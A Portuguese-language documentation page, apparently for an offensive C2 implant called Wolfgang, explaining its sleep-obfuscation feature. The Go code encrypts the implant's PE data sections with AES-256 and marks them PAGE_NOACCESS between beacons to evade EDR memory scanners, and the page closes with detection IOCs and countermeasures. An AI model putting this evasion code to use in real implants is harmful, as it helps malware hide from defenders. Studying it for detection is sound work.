    Sleep Obfuscation¶

    O que é¶

    Sleep obfuscation é a técnica de criptografar regiões de memória do implant durante períodos de inatividade (sleep). Enquanto o implant aguarda o próximo beacon interval, seu payload, strings e dados sensíveis ficam cifrados na memória, impedindo que memory scanners (EDRs, YARA rules em memória) identifiquem o malware.

    O Wolfgang implementa sleep obfuscation com AES-256-CTR encryption de seções PE e buffers registrados, combinado com cycling de permissões de memória via VirtualProtect.

    Por que funciona¶

    Memory scanners operam de duas formas:

    1. Periodic scanning: O EDR periodicamente varre a memória do processo procurando signatures conhecidas (strings, byte patterns, YARA rules)
    2. On-demand scanning: Quando um evento suspeito ocorre (ex: network callback), o EDR analisa a memória do processo envolvido

    Em ambos os casos, o scanner lê os bytes em memória e os compara com patterns. Se os bytes estão cifrados, nenhum pattern match ocorre.

    O truque é o timing: o implant passa a maioria do tempo dormindo (ex: 60s de sleep entre beacons). Durante esses 60s, um scanner tem alta probabilidade de encontrar o payload. Com sleep obfuscation:

    • Antes do sleep: Criptografa todas as regiões sensíveis
    • Durante o sleep: Memória contém apenas bytes criptografados + permissão NO_ACCESS
    • Após o sleep: Descriptografa e restaura permissões
    • Janela de exposição: Apenas os milissegundos da execução ativa

    Além da criptografia, o Wolfgang marca as regiões como PAGE_NOACCESS durante o sleep. Isso impede que o EDR sequer leia a memória -- qualquer tentativa de access resulta em access violation.

    Implementação no Wolfgang¶

    Estrutura principal¶

    type SleepObfuscator struct {
    Enabled bool
}

func (s *SleepObfuscator) ObfuscatedSleep(duration time.Duration) error {
    if !s.Enabled || duration <= 0 {
        time.Sleep(duration)
        return nil
    }
    return s.platformSleep(duration)
}

    Implementação Windows (3 fases)¶

    func (s *SleepObfuscator) platformSleep(duration time.Duration) error {
    // Gera chave AES-256 efêmera
    key := make([]byte, 32)
    rand.Read(key)

    // Enumera regiões seguras para criptografar
    regions, _ := enumerateSleepRegions()

    // FASE 1: Encrypt + NO_ACCESS
    var encrypted []encryptedRegion
    for _, r := range regions {
        data := unsafe.Slice((*byte)(unsafe.Pointer(r.addr)), r.size)

        // Torna gravável para criptografar
        oldProt, _ := winapi.VirtualProtect(r.addr, r.size, winapi.PageReadWrite)

        // Criptografa in-place
        nonce, _ := aesEncryptInPlace(data, key)

        // Marca como inacessível
        winapi.VirtualProtect(r.addr, r.size, winapi.PageNoAccess)

        encrypted = append(encrypted, encryptedRegion{
            addr: r.addr, size: r.size, nonce: nonce, oldProt: oldProt,
        })
    }

    // FASE 2: Sleep
    time.Sleep(duration)

    // FASE 3: Decrypt + restore permissions
    for _, er := range encrypted {
        winapi.VirtualProtect(er.addr, er.size, winapi.PageReadWrite)
        data := unsafe.Slice((*byte)(unsafe.Pointer(er.addr)), er.size)
        aesDecryptInPlace(data, key, er.nonce)
        winapi.VirtualProtect(er.addr, er.size, er.oldProt)
    }

    // Zero da chave
    for i := range key { key[i] = 0 }
    return nil
}

    Enumeração de regiões¶

    O Wolfgang não criptografa toda a memória do processo -- apenas regiões seguras e controladas:

    func enumerateSleepRegions() ([]sleepMemRegion, error) {
    // 1. Localiza o base address via PEB
    selfBase, _ := getSelfModuleBase()

    // 2. Parse do próprio PE para encontrar seções
    headerBytes := unsafe.Slice((*byte)(unsafe.Pointer(selfBase)), 4096)
    pe, _ := peparser.Parse(headerBytes)

    // 3. Apenas seções de dados (não código!)
    safeSections := []string{".data", ".rdata", ".bss"}
    for _, name := range safeSections {
        section := pe.GetSectionByName(name)
        if section != nil && section.VirtualSize > 0 {
            regions = append(regions, sleepMemRegion{
                addr: selfBase + uintptr(section.VirtualAddress),
                size: uintptr(section.VirtualSize),
            })
        }
    }

    // 4. Buffers explicitamente registrados (module cache, etc)
    for _, buf := range registeredSleepBuffers {
        regions = append(regions, buf)
    }

    return regions, nil
}

    As seções .text (código) não são incluídas porque criptografá-las causaria crash se alguma goroutine ou thread tentasse executar código durante o sleep. Apenas .data, .rdata e .bss (dados estáticos, constantes, globals) são alvos.

    Registro de buffers externos¶

    O module cache pode registrar suas regiões de memória para inclusão no sleep encryption:

    // Em qualquer lugar do implant:
evasion.RegisterSleepBuffer(addr, size)

// Quando o buffer for liberado:
evasion.UnregisterSleepBuffer(addr)

    Isso permite que módulos carregados dinamicamente também sejam protegidos durante o sleep.

    Detecção¶

    IOC Descrição
    VirtualProtect cycling Alternar RW -> NO_ACCESS -> RW em seções PE
    PAGE_NOACCESS em .data/.rdata Seções de dados normalmente não têm esta proteção
    Pattern de sleep longo com VP antes/depois Correlação temporal entre VP calls e Sleep
    Ausência de seções legíveis durante sleep Anomalia em scans periódicos

    Contramedidas¶

    • Kernel callbacks: PsSetCreateProcessNotifyRoutine e memory callbacks operam antes/fora do cycling de permissões
    • ETW memory events: Eventos de VirtualProtect podem ser capturados antes do ETW bypass (se o ETW bypass não estiver ativo)
    • Unbacked memory regions: Regiões sem backing em disco são suspeitas

    Limitações¶

    • Não protege a seção .text (código executável) -- risco de detecção via code scanning
    • O tempo de encrypt/decrypt cresce com o tamanho das regiões
    • Key material existe brevemente em registros/stack durante as transições
